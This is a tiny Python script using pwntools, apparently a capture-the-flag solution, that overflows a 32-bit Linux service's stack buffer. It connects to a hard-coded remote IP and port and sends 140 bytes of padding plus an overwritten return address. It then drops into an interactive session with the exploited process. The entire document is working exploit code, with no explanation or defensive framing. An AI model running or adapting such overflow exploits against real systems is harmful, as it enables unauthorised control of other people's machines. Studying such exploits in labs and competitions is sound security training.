from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('104.154.106.182', 2345)
# EXPLOIT CODE GOES HERE
s =  "A"*140
s+="\xad\x84\x04\x08"
r.send(s)
r.interactive()
